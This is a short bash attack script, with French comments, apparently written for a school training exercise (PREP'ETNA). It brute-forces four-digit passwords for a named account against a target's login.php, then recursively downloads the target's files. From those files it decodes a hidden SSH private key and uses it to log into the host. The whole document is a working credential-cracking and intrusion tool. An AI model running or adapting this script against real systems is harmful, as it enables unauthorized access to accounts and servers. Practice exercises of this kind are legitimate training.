# Titre Projet : quickCrack.sh			 #
						 #
# Pour piscine PREP'ETNA			 #
					       	 #
##################################################



#!/bin/bash

# Creation dossier output

mkdir ./out
mkdir ./out/www
touch ./out/id_ssh


# Boucle qui test chaque mdp jusqu'a bonne reponse

for i in $(seq -w 9999)
do
	codeHttp=$( curl -X POST -F "login=liquid_z" -F "password=${i}" "http://$1/login.php" -w '%{http_code}' -o /dev/null -s)
	echo "Nous testons:  ${i} "
	if [[ $codeHttp -eq 302 ]]
	then
		cd ./out/
		wget --no-parent -r -nH --reject="index.html*" "http://$1/files/"
		cd files
		mv * ../www
		echo "le mot de passe de liquid_z est:  ${i}"

		# Etape 2
		cd ../www
		rm -rf ../files/
		echo "La cle ssh est dans /out/id_ssh "
		find . -type f -exec grep '*.*' {} \; | sed 's/\./0/g' | sed 's/\*/1/g' | sed 's/.\{8\}/& /g' | perl -lape '$_=pack"(B8)*",@F' | sed -n '12,62p' >> ../id_ssh

		# Etape 3
		cd ..
		chmod 700 *
		ssh -i id_ssh liquid_z@$1
fi
done

